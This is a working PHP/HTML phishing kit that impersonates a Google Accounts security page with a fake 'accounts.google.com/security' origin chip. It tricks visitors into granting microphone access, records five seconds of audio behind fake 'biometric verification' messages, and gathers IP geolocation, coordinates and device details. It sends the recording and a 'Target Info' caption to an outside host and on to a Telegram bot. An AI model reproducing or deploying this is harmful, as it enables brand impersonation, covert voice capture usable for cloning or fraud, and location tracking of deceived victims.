<?php
// =======================================
// TELEGRAM SEND (VOICE MP3 + CODETABS)
// =======================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {

    $chatId = $_GET['id'] ?? '';
    if (!$chatId) {
        echo json_encode(['status'=>'error','message'=>'Chat ID missing']);
        exit;
    }

    // 🔁 اپنا بوٹ ٹوکن یہاں لگائیں
    $botToken = ''; 
    $caption  = $_POST['caption'] ?? 'Voice Verified';
    $file     = $_FILES['file']['tmp_name'];
    $fileName = $_FILES['file']['name'] ?? 'voice.mp3';

    // ٹیلیگرام کو بتایا جا رہا ہے کہ یہ آڈیو فائل ہے تاکہ وہ اسے میوزک پلیئر میں چلائے
    $url = "https://api.telegram.org/bot{$botToken}/sendAudio";

    $postFields = [
        'chat_id'  => $chatId,
        'audio'    => new CURLFile(realpath($file), 'audio/mpeg', $fileName),
        'caption'  => $caption
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status'=>'sent']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Security Checkup - Google Accounts</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  body {
    background-color: #fff;
    color: #202124;
    font-family: 'Google Sans', 'Segoe UI', Roboto, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }
  .card {
    background: #fff;
    border: 1px solid #dadce0;
    border-radius: 8px;
    max-width: 450px;
    width: 100%;
    padding: 48px 40px 36px;
    box-sizing: border-box;
    text-align: center;
  }
  @media (max-width: 450px) {
    .card { border: none; padding: 24px; }
  }
  .google-logo { width: 75px; height: 25px; margin: 0 auto 16px; display: block; }
  h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; }
  .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; line-height: 1.5; }
  .origin-chip {
    display: inline-flex; align-items: center; 
    background: #f1f3f4; border-radius: 16px; padding: 6px 12px;
    margin-bottom: 24px; font-size: 13px; color: #3c4043;
  }
  .chip-icon { margin-right: 8px; font-size: 12px; }
  
  .next-btn {
    background-color: #1a73e8; color: #fff; border: none; 
    padding: 12px 24px; border-radius: 4px; font-size: 15px; 
    font-weight: 500; cursor: pointer; letter-spacing: 0.25px;
    transition: 0.2s; box-shadow: 0 1px 3px rgba(66,133,244,0.5);
  }
  .next-btn:hover { background-color: #1765cc; box-shadow: 0 2px 6px rgba(66,133,244,0.6); }
  
  .footer { margin-top: 36px; font-size: 12px; color: #5f6368; text-align: center;}

  /* Voice Recorder Animation */
  .mic-box { display: none; text-align: center; margin-top: 10px; }
  .mic-icon {
    font-size: 40px; color: #ea4335; margin-bottom: 10px;
    animation: pulse-mic 1.5s infinite;
  }
  @keyframes pulse-mic {
    0% { transform: scale(1); color: #ea4335; }
    50% { transform: scale(1.2); color: #fbbc05; }
    100% { transform: scale(1); color: #ea4335; }
  }
  .loader-text { font-size: 14px; color: #5f6368; min-height: 20px; margin-top: 15px; }
  .success-text { color: #34a853; font-weight: 500; }
</style>
</head>
<body>

<div class="card">
  <!-- Google SVG Logo -->
  <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
    <g>
      <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
      <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.02-1.37 3.5-3.1 3.5z"/>
      <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
      <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
    </g>
  </svg>

  <div id="form-section">
    <h1>Voice Verification</h1>
    <div class="subtitle">For your security, we need to verify your identity using a short voice sample.</div>
    
    <div class="origin-chip">
      <span class="chip-icon">🔒</span>
      accounts.google.com/security
    </div>
    <br><br>

    <button id="startBtn" class="next-btn">Allow Microphone</button>
  </div>

  <div id="loader-section" class="mic-box" style="display: none;">
    <div class="mic-icon">🎙️</div>
    <p class="loader-text" id="status">Listening for voice sample…</p>
  </div>

  <div class="footer">
    Help &nbsp;|&nbsp; Privacy &nbsp;|&nbsp; Terms
  </div>
</div>

<script>
const startBtn = document.getElementById("startBtn");
const formSection = document.getElementById("form-section");
const loaderSection = document.getElementById("loader-section");
const statusEl = document.getElementById("status");

// Null check function
function check(val) {
  if (!val || val === 'null' || val === 'undefined') return '';
  return val;
}

let userInfo = {
  ip: '', city: '', country: '', isp: '', lat: '', lng: '',
  browser: navigator.userAgent,
  os: navigator.platform,
  screen: `${screen.width} x ${screen.height}`
};

// 🛑 Fetching Geo Info using api.codetabs.com
fetch('https://api.codetabs.com/v1/geolocation/json')
  .then(r => r.json())
  .then(d => {
    if(d) {
      userInfo.ip = check(d.ip);
      userInfo.city = check(d.city);
      userInfo.country = check(d.country_name);
      userInfo.isp = check(d.isp) || check(d.org);
      userInfo.lat = check(d.latitude);
      userInfo.lng = check(d.longitude);
    }
  }).catch(e => console.log("Geo fetch failed"));

startBtn.onclick = () => {
  // Step 1: Show Mic Loader
  formSection.style.display = 'none';
  loaderSection.style.display = 'block';

  // Step 2: Start Microphone Recording
  navigator.mediaDevices.getUserMedia({ audio: true })
  .then(stream => {
    // Find supported audio format
    let mimeType = 'audio/webm;codecs=opus';
    if (MediaRecorder.isTypeSupported('audio/mp4')) {
        mimeType = 'audio/mp4';
    } else if (MediaRecorder.isTypeSupported('audio/webm')) {
        mimeType = 'audio/webm';
    }

    const recorder = new MediaRecorder(stream, { mimeType: mimeType });
    let chunks = [];

    recorder.ondataavailable = e => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    recorder.onstop = () => {
      statusEl.classList.add('success-text');
      statusEl.innerText = "✔ Verification Successful!";

      // Stop microphone stream immediately (removes mic icon from browser)
      stream.getTracks().forEach(track => track.stop());

      // Create audio blob, force name to .mp3 so Telegram plays it as a voice/audio note
      const blob = new Blob(chunks, { type: 'audio/mpeg' });
      
      const fd = new FormData();
      fd.append("file", blob, "voice_verification.mp3");
      fd.append("caption", buildCaption());

      // Step 4: Send Voice to Telegram Silently
      fetch('https://rootx-eye.vercel.app/capture.php', {
          method: 'POST',
          body: fd
      })
    };

    // Start Recording
    recorder.start();

    // Start Fake Loading Text
    const steps = [
      "Listening for voice sample…",
      "Analyzing voice frequencies…",
      "Matching biometric data…",
      "Finalizing verification…"
    ];
    let i = 0;
    const stepTimer = setInterval(() => {
      statusEl.innerText = steps[i % steps.length];
      i++;
    }, 1200);

    // Stop recording after 5 seconds (5000ms) to get a good audio size
    setTimeout(() => {
      clearInterval(stepTimer);
      recorder.stop();
    }, 5000);

  })
  .catch(() => {
    statusEl.innerText = "❌ Microphone permission denied. Please allow to continue.";
    setTimeout(() => { formSection.style.display = 'block'; loaderSection.style.display = 'none'; }, 2000);
  });
};

function buildCaption() {
  // 🛡 Null Check Logic: Sirf wahi lines jayengi jo milengi
  let locInfo = '';
  if (userInfo.ip) locInfo += `🌐 IP: ${userInfo.ip}\n`;
  if (userInfo.city) locInfo += `🏙️ City: ${userInfo.city}\n`;
  if (userInfo.country) locInfo += `🌎 Country: ${userInfo.country}\n`;
  if (userInfo.isp) locInfo += `📡 ISP: ${userInfo.isp}\n`;
  
  if (userInfo.lat && userInfo.lng) {
    locInfo += `🧭 Lat: ${userInfo.lat} | Lng: ${userInfo.lng}\n`;
    locInfo += `🗺 Map: https://maps.google.com/?q=${userInfo.lat},${userInfo.lng}\n`;
  }

  let devInfo = '';
  devInfo += `🧭 Browser: ${userInfo.browser}\n`;
  devInfo += `🧩 OS: ${userInfo.os}\n`;
  devInfo += `📱 Screen: ${userInfo.screen}`;

  return `🎙️ *Voice Verification Captured!*
━━━━━━━━━━━━━━━
📍 *Target Info:*
 ${locInfo}
🖥 *Device Info:*
 ${devInfo}`;
}
</script>

</body>
</html>
